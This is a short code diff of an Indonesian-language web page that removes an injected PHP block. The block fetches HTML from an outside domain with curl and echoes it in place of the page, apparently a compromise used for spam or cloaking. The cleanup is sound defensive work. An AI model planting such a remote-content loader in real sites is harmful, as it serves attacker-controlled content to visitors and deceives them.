@@ -1,10 +1,4 @@
-<?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
 
-$ch = curl_init("https://aeskyhigh.xyz/amp/open-publishing/naik.html");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$data = curl_exec($ch);
 
 <!DOCTYPE html>
 <html lang="id">
@@ -5927,7 +5921,3 @@ margin:0 26px 35px;
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"64730601b91840f689de1943b4be42ce","r":1}' crossorigin="anonymous"></script>
 </body>
 </html>
-curl_close($ch);
-
-echo $data;
-?>
